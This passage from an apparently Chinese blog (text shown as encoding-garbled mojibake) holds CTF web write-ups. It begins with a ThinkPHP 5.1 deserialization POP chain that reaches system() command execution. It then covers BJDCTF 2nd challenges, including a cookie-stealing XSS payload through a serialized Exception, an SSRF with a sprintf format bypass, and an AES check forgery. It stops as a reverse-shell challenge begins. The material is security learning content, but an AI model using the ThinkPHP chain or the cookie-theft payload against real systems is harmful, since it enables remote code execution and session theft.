<p>æ‰§è¡Œä»£ç ã€‚</p>
<h2 id="åˆ†æPOC"><a href="#åˆ†æPOC" class="headerlink" title="åˆ†æPOC"></a>åˆ†æPOC</h2><p>é¦–å…ˆæ„é€ <code>POC</code>ç”¨æ¥è§¦å‘<code>Requests</code>ç±»çš„<code>__call()</code>é­”æœ¯æ–¹æ³•</p>
<p>å›åˆ°<code>toArray()</code>å‡½æ•°ï¼Œåœ¨<code>Conversionç±»</code>ä¸­</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> $key =&gt; $name) &#123;</span><br><span class="line">                <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">                    <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">                    $relation = <span class="keyword">$this</span>-&gt;getRelation($key);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!$relation) &#123;</span><br><span class="line">                        $relation = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">                        $relation-&gt;visible($name);</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œåˆ†æä¸€ä¸‹<code>getAttr()</code>,è·Ÿè¿›è¯¥å‡½æ•°</p>
<p><img src="/.com//17.png" alt="image-20200314172853130"></p>
<p>ç„¶åè·Ÿè¿›<code>getData()</code></p>
<p><img src="/.com//16.png" alt="image-20200314173040454"></p>
<p>åœ¨<code>Attribute</code>ç±»ä¸­ï¼Œ<code>$this-&gt;data</code>å¯æ§ï¼Œ<code>$name</code>æ¥è‡ªäº<code>getAttr()</code>çš„<code>$name</code>,<code>getAttr()</code>çš„<code>$name</code>æ¥è‡ª<code>$this-&gt;append as $key =&gt; $name</code></p>
<p>æ‰€ä»¥æ„é€ ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $append = [];</span><br><span class="line">    <span class="keyword">private</span> $data = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">"lin"</span>=&gt;[<span class="string">"calc.exe"</span>,<span class="string">"calc"</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">"lin"</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å­å°±æœ‰<code>return $this-&gt;data[&#39;lin&#39;]=new Request();</code></p>
<p>è¿™æ ·å­å°±èƒ½è§¦å‘<code>Request</code>ç±»çš„<code>__call()</code></p>
<p>è¿™é‡Œçš„<code>POC</code>ä½¿ç”¨<code>Modelç±»</code>çš„åŸå› æ˜¯<code>$this-&gt;data</code>å’Œ<code>getAttr()</code>åˆ†åˆ«æ¥è‡ªä¸¤ä¸ªç±»</p>
<p>åªè¦<code>Model</code>ç±»åŒæ—¶ç»§æ‰¿äº†è¿™ä¸¤ä¸ªç±»</p>
<p><img src="/.com//17.png" alt="image-20200314172853130"></p>
<p><code>POC</code>çš„ç¬¬äºŒéƒ¨åˆ†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $hook = [];</span><br><span class="line">    <span class="keyword">protected</span> $filter = <span class="string">"system"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = [</span><br><span class="line">        <span class="comment">// è¡¨å•ajaxä¼ªè£…å˜é‡</span></span><br><span class="line">        <span class="string">'var_ajax'</span>         =&gt; <span class="string">'_ajax'</span>,  </span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">"system"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">"var_ajax"</span>=&gt;<span class="string">'pho'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">"visible"</span>=&gt;[<span class="keyword">$this</span>,<span class="string">"isAjax"</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è§¦å‘<code>__call</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($method, <span class="keyword">$this</span>-&gt;hook)) &#123;</span><br><span class="line">        array_unshift($args, <span class="keyword">$this</span>);</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;hook[$method], $args);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'method not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $method);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶æœ‰<code>$this-&gt;hook[$method]=$this-&gt;hook[&#39;visible&#39;]=isAjax</code>ï¼Œè¿›è€Œè§¦å‘<code>isAjax()</code>ï¼Œç„¶åè§¦å‘<code>input()</code></p>
<p>æˆ‘ä»¬é€šè¿‡<code>GET</code>è¯·æ±‚å‘é€çš„<code>pho=whoami</code>,æœ€ç»ˆä¼šä½¿å¾—åœ¨ç»è¿‡<code>getData()</code>åï¼Œæœ‰$data<code>[&#39;pho&#39;]=whoami</code>,å¹¶ä¸”<code>$this-&gt;filter = &quot;system&quot;;</code>,ç„¶åè¿›å…¥<code>filterValue()</code>å‡½æ•°ï¼Œè§¦å‘<code>call_user_func_arry()</code></p>
<p>æ‰§è¡Œ<code>system(whoami)</code></p>
<p>ç¬¬ä¸‰éƒ¨åˆ†ç”¨äºè§¦å‘<code>Model</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œ<code>Windows</code>ä¸‹çš„<code>$this-&gt;files</code>è¦åˆ›å»ºä¸€ä¸ª<code>Pivot</code>å¯¹è±¡æ˜¯å› ä¸º<code>Pivot</code>ç»§æ‰¿<code>Model</code></p>
<p>ä½†æ˜¯æˆ‘ä»¬åªè¦useä¸€ä¸‹<code>think\model\concern\Conversion</code>å°±ä¼šè·³å»Conversionä¸‹çš„<code>__toString</code>æ–¹æ³•</p>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://blog.csdn.net/chasingin/article/details/103639547" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/103639547</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/03/30/thinkphp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="ck8sqr5k8001ekou51dvd8mpu" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-BJDCTF-2nd" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/20/BJDCTF-2nd/" class="article-date">
  <time datetime="2020-03-20T13:40:49.000Z" itemprop="datePublished">2020-03-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/03/20/BJDCTF-2nd/">BJDCTF-2nd</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="BJDCTF"><a href="#BJDCTF" class="headerlink" title="BJDCTF"></a>BJDCTF</h1><p>[BJDCTF 2nd]-web&amp;&amp;misc</p>
<h1 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h1><h2 id="BJDCTF-2nd-å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"><a href="#BJDCTF-2nd-å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€" class="headerlink" title="[BJDCTF 2nd]å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"></a>[BJDCTF 2nd]å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€</h2><p>è€ƒç‚¹ï¼šHTTPåè®®</p>
<p>éšä¾¿ç”¨ä¸ªè´¦å·ç™»é™†ï¼Œä¼šåœ¨è¿”å›é¡µé¢ä¸­å‘ç°</p>
<p><img src="/.com//1.png" alt="image-20200326150351129"></p>
<p>ç„¶åè®¿é—®æ–‡ä»¶ï¼Œæ ¹æ®å®ƒçš„æç¤ºæ·»åŠ ä¸€ä¸ªä¸ªåè®®å¤´</p>
<p><img src="/.com//2.png" alt="image-20200326150549636"></p>
<p>base64è§£ç </p>
<h2 id="BJDCTF-2nd-SchroÌˆdinger"><a href="#BJDCTF-2nd-SchroÌˆdinger" class="headerlink" title="[BJDCTF 2nd]SchroÌˆdinger"></a>[BJDCTF 2nd]SchroÌˆdinger</h2><p>è€ƒç‚¹ï¼šæ—¶é—´æˆ³</p>
<p><img src="/.com//3.png" alt="image-20200326153608641"></p>
<p>é¢˜ç›®hintæœ‰ç»™äº†<code>test.php</code>ï¼Œå¾—å»çˆ†ç ´è¿™ä¸ªé¡µé¢</p>
<p><img src="/.com//4.png" alt="image-20200326153713228"></p>
<p>ä½†æ˜¯è¿™ä¸ªrateå®åœ¨æ˜¯å¢é•¿å¾—å¤ªæ…¢äº†ï¼ŒæŠ“åŒ…å‘ç°åœ¨cookieä¸­æœ‰ä¸€ä¸ªæ—¶é—´æˆ³</p>
<p><img src="/.com//5.png" alt="image-20200326153839712"></p>
<p>å‘ç°è¿™ä¸ªæ—¶é—´æˆ³æ˜¯base64åŠ å¯†çš„è¿‡ç¨‹ï¼Œç´¢æ€§æŠŠè¿™ä¸ªæ—¶é—´æˆ³ç»™ç½®ç©ºã€‚</p>
<p><img src="/.com//6.png" alt="image-20200326154113812"></p>
<p>ç„¶åcheckä¸€ä¸‹ï¼ŒåŒæ ·è¦ç½®ç©ºæ—¶é—´æˆ³</p>
<p><img src="/.com//7.png" alt="image-20200326154153026"></p>
<p>ç„¶åå»<code>bilibili</code>æ‰¾è¿™ä¸ªè§†é¢‘ï¼Œé‡å­åŠ›å­¦â€¦..è¯„è®ºä¸­â€¦.</p>
<p><img src="/.com//8.png" alt="image-20200326154444676"></p>
<h2 id="BJDCTF-2nd-xssä¹‹å…‰"><a href="#BJDCTF-2nd-xssä¹‹å…‰" class="headerlink" title="[BJDCTF 2nd]xssä¹‹å…‰"></a>[BJDCTF 2nd]xssä¹‹å…‰</h2><p>è€ƒç‚¹ï¼šåˆ©ç”¨<code>php</code>å†…ç½®ç±»è¿›è¡Œ<code>xss</code> ï¼Œ<code>.git</code>æ³„éœ²</p>
<p>é¦–å…ˆgitæ³„éœ²è·å¾—æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'yds_is_so_beautiful'</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize($a);</span><br></pre></td></tr></table></figure>



<p>ä½¿ç”¨å†…ç½®ç±»<code>Exception()</code>å¯ä»¥è§¦å‘<code>XSS</code>ï¼Œå¹¶ä¸”ä½¿ç”¨<code>windows.open()</code>å¸¦å‡ºcookie</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"&lt;script&gt;windows.open(document.cookie)&lt;/script&gt;"</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br></pre></td></tr></table></figure>

<p><img src="/.com//9.png" alt="image-20200326161508395"></p>
<h2 id="BJDCTF-2nd-æ–‡ä»¶æ¢æµ‹"><a href="#BJDCTF-2nd-æ–‡ä»¶æ¢æµ‹" class="headerlink" title="[BJDCTF 2nd]æ–‡ä»¶æ¢æµ‹"></a>[BJDCTF 2nd]æ–‡ä»¶æ¢æµ‹</h2><p>è®¿é—®<code>robots.txt</code></p>
<p><img src="/.com//10.png" alt="image-20200326170921061"></p>
<p>ç„¶åè®¿é—®index.php</p>
<p><img src="/.com//11.png" alt="image-20200326170955058"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">'y1ng'</span>]) || $_COOKIE[<span class="string">'y1ng'</span>] !== sha1(md5(<span class="string">'y1ng'</span>))) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');&lt;/script&gt;"</span>;</span><br><span class="line">	header(<span class="string">"Refresh:0.1;url=index.php"</span>);</span><br><span class="line">	<span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filter1 = <span class="string">'/^http:\/\/127\.0\.0\.1\//i'</span>;</span><br><span class="line">$filter2 = <span class="string">'/.?f.?l.?a.?g.?/i'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'q1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q3'</span>]) ) &#123;</span><br><span class="line">	$url = $_POST[<span class="string">'q2'</span>].<span class="string">".y1ng.txt"</span>;</span><br><span class="line">	$method = $_POST[<span class="string">'q3'</span>];</span><br><span class="line">	$str1 = <span class="string">"~$ python fuck.py -u \""</span>.$url .<span class="string">"\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> $str1;</span><br><span class="line">	<span class="keyword">if</span> (!preg_match($filter1, $url) ) &#123;</span><br><span class="line">		<span class="keyword">die</span>($str2);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (preg_match($filter2, $url)) &#123;</span><br><span class="line">		<span class="keyword">die</span>($str3);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!preg_match(<span class="string">'/^GET/i'</span>, $method) &amp;&amp; !preg_match(<span class="string">'/^POST/i'</span>, $method)) &#123;</span><br><span class="line">		<span class="keyword">die</span>($str4);</span><br><span class="line">	&#125;</span><br><span class="line">	$detect = @file_get_contents($url, <span class="keyword">false</span>);</span><br><span class="line">	<span class="keyword">print</span>(sprintf(<span class="string">"$url method&amp;content_size:$method%d"</span>, $detect));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆ<code>q1</code>æ²¡æœ‰è¦æ±‚</p>
<p><code>q2=http://127.0.0.1/admin</code>#ï¼Œå› ä¸ºè¿™é‡Œçš„<code>file_get_content()</code>æ²¡æ³•è¯»æ–‡ä»¶ï¼Œåªèƒ½<code>SSRF</code></p>
<p>ç„¶å<code>q3</code>æœ‰ä¸¤ä¸ªæ–¹æ³•ç»•è¿‡<code>sprintf()</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(1)</span><br><span class="line">q3&#x3D;GET%1$S æŒ‡å®šç¬¬ä¸€ä¸ªå‚æ•°ä¸ºstringç±»å‹è¾“å‡º</span><br><span class="line"></span><br><span class="line">(2)</span><br><span class="line">q3&#x3D;GET%S% ç¬¬äºŒä¸ª%ä¼šå°†%è½¬ä¹‰ï¼Œä½¿å¾—%då¤±æ•ˆ</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q1=a&amp;q2=http:<span class="comment">//127.0.0.1/admin.php#&amp;q3=GET%1$s</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag = <span class="string">'f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;'</span>; <span class="comment">//fake</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">'AES-128-CBC'</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>],<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'your_ip_address'</span>]) &amp;&amp; $_COOKIE[<span class="string">'your_ip_address'</span>] === md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_COOKIE[<span class="string">'y1ng'</span>] === sha1(md5(<span class="string">'y1ng'</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">"127.0.0.1"</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size='10px' color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is "</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'user'</span>] = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'decrypt'</span>])) &#123;</span><br><span class="line">    $decr = $_GET[<span class="string">'decrypt'</span>];</span><br><span class="line">    <span class="keyword">if</span> (Check())&#123;</span><br><span class="line">        $data = $_SESSION[<span class="string">'secret'</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'flag_2sln2ndln2klnlksnf.php'</span>;</span><br><span class="line">        $cipher = aesEn($data, <span class="string">'y1ng'</span>);</span><br><span class="line">        <span class="keyword">if</span> ($decr === $cipher)&#123;</span><br><span class="line">            <span class="keyword">echo</span> WHAT_YOU_WANT;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'çˆ¬'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">"Refresh:0.1;url=index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//I heard you can break PHP mt_rand seed</span></span><br><span class="line">    mt_srand(rand(<span class="number">0</span>,<span class="number">9999999</span>));</span><br><span class="line">    $length = mt_rand(<span class="number">40</span>,<span class="number">80</span>);</span><br><span class="line">    $_SESSION[<span class="string">'secret'</span>] = bin2hex(random_bytes($length));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å…³é”®ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">       </span><br><span class="line">$data = $_SESSION[<span class="string">'secret'</span>];   </span><br><span class="line">$cipher = aesEn($data, <span class="string">'y1ng'</span>);</span><br></pre></td></tr></table></figure>

<p>ç„¶åä¸ºäº†<code>$decr === $cipher</code></p>
<p>ä»¤<code>$data=$_SESSION[&#39;secret&#39;]=NULL</code>ï¼Œé‚£ä¹ˆ<code>$cipher = aesEn(NULL, &#39;y1ng&#39;);</code></p>
<p>è¿™æ ·å­å°±èƒ½ä½¿å¾—<code>$decr = $_GET[&#39;decrypt&#39;]</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $remote= <span class="string">'174.0.222.75'</span>;</span><br><span class="line">    $method = <span class="string">'AES-128-CBC'</span>;</span><br><span class="line">    $iv = md5($remote,<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> aesEn(<span class="string">""</span>,<span class="string">"y1ng"</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">70</span>klfZeYC+WlC045CcKhtg==</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å­ï¼Œåœ¨è®¿é—®æ—¶åˆ é™¤cookieä¸­çš„phpsessionã€‚</p>
<p><img src="/.com//12.png" alt="image-20200326213049661"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/03/20/BJDCTF-2nd/" data-id="ck8sqr5h40000kou52ih699yf" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-V-N2020å…¬å¼€èµ›" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/16/V-N2020%E5%85%AC%E5%BC%80%E8%B5%9B/" class="article-date">
  <time datetime="2020-03-16T02:56:54.000Z" itemprop="datePublished">2020-03-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/03/16/V-N2020%E5%85%AC%E5%BC%80%E8%B5%9B/">V&amp;N2020å…¬å¼€èµ›</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="V-amp-N2020-å…¬å¼€èµ›"><a href="#V-amp-N2020-å…¬å¼€èµ›" class="headerlink" title="V&amp;N2020 å…¬å¼€èµ›"></a>V&amp;N2020 å…¬å¼€èµ›</h1><p>V&amp;N2020 å…¬å¼€èµ›</p>
<h2 id="V-amp-N2020-å…¬å¼€èµ›-CHECKIN"><a href="#V-amp-N2020-å…¬å¼€èµ›-CHECKIN" class="headerlink" title="[V&amp;N2020 å…¬å¼€èµ›]CHECKIN"></a>[V&amp;N2020 å…¬å¼€èµ›]CHECKIN</h2><p>è€ƒç‚¹ï¼šåå¼¹shell</p>
<p>è·å¾—æºç ï¼š</p>
